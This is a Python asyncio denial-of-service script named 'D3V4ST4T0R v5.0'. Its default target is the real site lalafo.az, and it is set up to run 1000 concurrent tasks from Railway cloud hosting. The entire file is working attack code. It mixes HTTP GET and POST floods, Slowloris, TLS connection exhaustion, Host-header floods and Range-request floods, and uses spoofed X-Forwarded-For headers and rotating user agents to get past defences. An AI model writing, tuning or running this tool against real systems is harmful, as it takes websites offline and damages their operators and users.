import asyncio
import aiohttp
import ssl
import random
import time
import os
import sys
import socket
from urllib.parse import urlparse, urlencode

# === CONFIG FROM ENV ===
TARGET = os.getenv("TARGET", "lalafo.az")
PORT = int(os.getenv("PORT", "443"))
SSL = os.getenv("SSL", "true").lower() == "true"
THREADS = int(os.getenv("THREADS", "1000"))  # Railway-ə uyğun 1000 task
DURATION = int(os.getenv("DURATION", "120"))

TARGET_URL = f"{'https' if SSL else 'http'}://{TARGET}:{PORT}/"
BANNER = f"""
███████████████████████████████████████████████████████████████████████████
█  D3V4ST4T0R v5.0 — Railway Asyncio Optimized                         █
█  Target: {TARGET_URL[:70]:<70}█
█  Tasks: {THREADS:<5} | Duration: {DURATION}s | Port: {PORT:<5}         █
███████████████████████████████████████████████████████████████████████████
"""

# === User-Agent Pool ===
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
]

# === Path Pool ===
PATH_POOL = [
    "/", "/az", "/en", "/ru",
    "/search", "/ads", "/categories", "/post-ad",
    "/login", "/register", "/forgot-password",
    "/user/profile", "/user/settings", "/messages",
    "/favorites", "/notifications", "/help",
    "/terms", "/privacy", "/about", "/contact",
    "/sitemap.xml", "/robots.txt",
]

# === SSL Context (lazy init) ===
_ssl_ctx = None
def get_ssl_context():
    global _ssl_ctx
    if _ssl_ctx is None:
        _ssl_ctx = ssl.create_default_context()
        _ssl_ctx.check_hostname = False
        _ssl_ctx.verify_mode = ssl.CERT_NONE
        _ssl_ctx.set_ciphers('ALL:@SECLEVEL=0')
    return _ssl_ctx

# === 1. HTTP GET Flood (optimized) ===
async def http_flood(session, stats):
    """High-speed GET requests with random paths & headers"""
    while True:
        try:
            path = random.choice(PATH_POOL)
            cache_buster = f"?_{random.randint(1, 10**9)}"
            url = f"{TARGET_URL.rstrip('/')}{path}{cache_buster}"
            
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "az,en-US;q=0.9,en;q=0.8,ru;q=0.7",
                "Accept-Encoding": "gzip, deflate, br",
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Referer": f"https://{TARGET}/{random.choice(['', 'az', 'en', 'ru'])}",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                "Connection": "keep-alive",
                "DNT": "1",
            }
            
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                await resp.read()
                stats[0] += 1
        except:
            stats[1] += 1
            await asyncio.sleep(0)

# === 2. POST Flood (optimized) ===
async def post_flood(session, stats):
    """High-volume POST requests to various endpoints"""
    endpoints = ["/search", "/login", "/register", "/contact", "/post-ad", "/feedback"]
    while True:
        try:
            endpoint = random.choice(endpoints)
            url = f"{TARGET_URL.rstrip('/')}{endpoint}"
            payload_size = random.randint(5000, 50000)
            
            # Mixed payload types
            payload_type = random.randint(1, 3)
            if payload_type == 1:
                data = {f"field_{i}": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(5,50))) for i in range(random.randint(5,20))}
            elif payload_type == 2:
                data = f"username={'admin' if random.random()>0.5 else 'user'}&password={'admin' if random.random()>0.5 else 'pass'}&csrf_token={random.randint(10**15,10**16-1)}&description={'A'*payload_size}"
            else:
                data = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789&=", k=payload_size))
            
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Content-Type": random.choice(["application/x-www-form-urlencoded", "multipart/form-data", "text/plain"]),
                "Accept": "*/*",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            }
            
            async with session.post(url, data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                await resp.read()
                stats[2] += 1
        except:
            stats[3] += 1
            await asyncio.sleep(0)

# === 3. Slowloris v2 (fixed & improved) ===
async def slowloris(stats):
    """Fixed Slowloris - raw TCP with slow header trickle"""
    while True:
        writer = None
        try:
            ctx = get_ssl_context() if SSL else None
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(TARGET, PORT, ssl=ctx),
                timeout=20
            )
            
            # Send initial request line slowly
            method = random.choice(["GET", "POST", "HEAD", "OPTIONS"])
            path = random.choice(PATH_POOL)
            writer.write(f"{method} {path} HTTP/1.1\r\n".encode())
            await writer.drain()
            await asyncio.sleep(random.uniform(3, 8))
            
            # Send headers one by one with delays
            headers = [
                f"Host: {TARGET}\r\n",
                f"User-Agent: {random.choice(UA_POOL)}\r\n",
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                f"Accept-Language: az,en-US;q=0.9,en;q=0.8,ru;q=0.7\r\n",
                f"Content-Length: {random.randint(10000, 1000000)}\r\n",
                f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n",
            ]
            
            for h in headers:
                writer.write(h.encode())
                await writer.drain()
                await asyncio.sleep(random.uniform(2, 5))
            
            # Keep alive with trickle headers
            for _ in range(random.randint(15, 40)):
                writer.write(f"X-KeepAlive-{random.randint(1,9999)}: {random.randint(1,10**8)}\r\n".encode())
                await writer.drain()
                await asyncio.sleep(random.uniform(5, 12))
            
            stats[4] += 1  # slowloris success
            writer.close()
            await writer.wait_closed()
        except:
            stats[5] += 1  # slowloris fail
            if writer:
                try:
                    writer.close()
                except:
                    pass
            await asyncio.sleep(random.uniform(0.5, 2))

# === 4. SSL/TLS Exhaustion ===
async def ssl_reneg(stats):
    """SSL connection exhaustion - rapid connect/disconnect"""
    while True:
        writer = None
        try:
            ctx = get_ssl_context()
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(TARGET, PORT, ssl=ctx),
                timeout=10
            )
            
            # Send incomplete requests to waste SSL processing
            partial = random.choice([
                f"GET / HTTP/1.1\r\n".encode(),
                f"POST / HTTP/1.1\r\nContent-Length: 999999\r\n".encode(),
                b"\x00\x01\x02\x03" * 100,  # garbage
            ])
            writer.write(partial)
            await writer.drain()
            
            stats[6] += 1
            writer.close()
            await writer.wait_closed()
        except:
            stats[7] += 1
            if writer:
                try:
                    writer.close()
                except:
                    pass
            await asyncio.sleep(0)

# === 5. DNS amplification (via HTTP Host header) ===
async def host_header_flood(session, stats):
    """Send requests with random Host headers to confuse routing/load balancers"""
    fake_hosts = [
        f"{random.randint(1,999)}.{TARGET}",
        f"www{random.randint(1,999)}.{TARGET}",
        f"cdn{random.randint(1,99)}.{TARGET}",
        f"api{random.randint(1,99)}.{TARGET}",
        f"mail.{TARGET}",
        f"admin.{TARGET}",
        f"vpn.{TARGET}",
    ]
    while True:
        try:
            url = TARGET_URL.rstrip('/')
            headers = {
                "Host": random.choice(fake_hosts),
                "User-Agent": random.choice(UA_POOL),
                "Accept": "*/*",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            }
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                await resp.read()
                stats[8] += 1
        except:
            stats[9] += 1
            await asyncio.sleep(0)

# === 6. Range request flood ===
async def range_flood(session, stats):
    """HTTP Range header requests - forces server to process partial content"""
    while True:
        try:
            path = random.choice(PATH_POOL)
            url = f"{TARGET_URL.rstrip('/')}{path}"
            start = random.randint(0, 100000)
            end = start + random.randint(100, 10000)
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Range": f"bytes={start}-{end}",
                "Accept-Encoding": "gzip, deflate",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            }
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                await resp.read()
                stats[10] += 1
        except:
            stats[11] += 1
            await asyncio.sleep(0)

# === Health Check Server ===
async def handle_health(reader, writer):
    writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK")
    await writer.drain()
    writer.close()
    await writer.wait_closed()

async def health_server():
    try:
        server = await asyncio.start_server(
            handle_health, host="0.0.0.0", port=8080
        )
        print(f"[+] Health check server running on port 8080")
        return server
    except Exception as e:
        print(f"[!] Health server: {e}")
        return None

# === Stats Printer ===
async def stats_printer(stats, stop_event):
    """Print live stats every 5 seconds"""
    prev = [0] * 12
    while not stop_event.is_set():
        await asyncio.sleep(5)
        elapsed = time.time() - start_time
        line = f"  [{int(elapsed)}s] "
        
        if stats[0] - prev[0] > 0:
            line += f"GET:{stats[0]-prev[0]:>4} "
        if stats[2] - prev[2] > 0:
            line += f"POST:{stats[2]-prev[2]:>4} "
        if stats[4] - prev[4] > 0:
            line += f"SLOW:{stats[4]-prev[4]:>3} "
        if stats[6] - prev[6] > 0:
            line += f"SSL:{stats[6]-prev[6]:>4} "
        if stats[8] - prev[8] > 0:
            line += f"HOST:{stats[8]-prev[8]:>4} "
        if stats[10] - prev[10] > 0:
            line += f"RANGE:{stats[10]-prev[10]:>4} "
        
        total = sum(stats[0::2])  # all success counters
        fails = sum(stats[1::2])  # all fail counters
        line += f"| Total: {total} | Fails: {fails}"
        print(line)
        
        for i in range(12):
            prev[i] = stats[i]

# === Main Worker Pool ===
async def worker_pool(stats):
    connector = aiohttp.TCPConnector(
        limit=0,
        force_close=True,
        ttl_dns_cache=0,
        verify_ssl=False,
        use_dns_cache=False,
        enable_cleanup_closed=True,
    )
    timeout = aiohttp.ClientTimeout(total=0)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        methods = [
            (http_flood, 30),      # 30% GET flood
            (post_flood, 20),       # 20% POST flood
            (slowloris, 15),        # 15% Slowloris
            (ssl_reneg, 15),        # 15% SSL exhaustion
            (host_header_flood, 10), # 10% Host header
            (range_flood, 10),      # 10% Range requests
        ]
        
        tasks = []
        for i in range(THREADS):
            # Weighted random method selection
            r = random.random() * 100
            cumulative = 0
            chosen_func = http_flood
            for func, weight in methods:
                cumulative += weight
                if r <= cumulative:
                    chosen_func = func
                    break
            
            if chosen_func in (http_flood, post_flood, host_header_flood, range_flood):
                task = asyncio.create_task(chosen_func(session, stats))
            else:
                task = asyncio.create_task(chosen_func(stats))
            
            tasks.append(task)
        
        print(f"  [+] Launched {len(tasks)} attack tasks\n")
        
        # Run for duration
        await asyncio.sleep(DURATION)
        
        # Cancel all
        for t in tasks:
            t.cancel()
        
        print("\n[✓] Attack complete. All tasks stopped.")

# === Main ===
start_time = time.time()

async def main():
    print(BANNER)
    print(f"[+] Resolving {TARGET}...")
    
    try:
        ips = socket.getaddrinfo(TARGET, PORT)
        resolved = list(set(ip[4][0] for ip in ips))
        print(f"  [+] Resolved to: {resolved}")
    except Exception as e:
        print(f"  [!] DNS resolution failed: {e}")
        sys.exit(1)
    
    print(f"[+] Starting attack with {THREADS} concurrent tasks for {DURATION}s")
    print(f"  [+] Methods: GET Flood, POST Flood, Slowloris, SSL Exhaustion, Host Header, Range Flood")
    print(f"  [+] URL: {TARGET_URL}")
    print()
    
    stats = [0] * 12  # [get_ok, get_fail, post_ok, post_fail, slow_ok, slow_fail, ssl_ok, ssl_fail, host_ok, host_fail, range_ok, range_fail]
    stop_event = asyncio.Event()
    
    # Start health server
    health_task = asyncio.create_task(health_server())
    
    # Start stats printer
    stats_task = asyncio.create_task(stats_printer(stats, stop_event))
    
    # Start attack
    try:
        await worker_pool(stats)
    except asyncio.CancelledError:
        print("\n[!] Attack cancelled")
    finally:
        stop_event.set()
    
    # Final stats
    total_ok = sum(stats[0::2])
    total_fail = sum(stats[1::2])
    print(f"\n[+] Final Stats:")
    print(f"  [+] Successful requests: {total_ok}")
    print(f"  [+] Failed requests: {total_fail}")
    print(f"  [+] Success rate: {total_ok/(total_ok+total_fail)*100:.1f}%" if (total_ok+total_fail) > 0 else "  [+] No requests completed")
    print("[✓] Done.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(0)
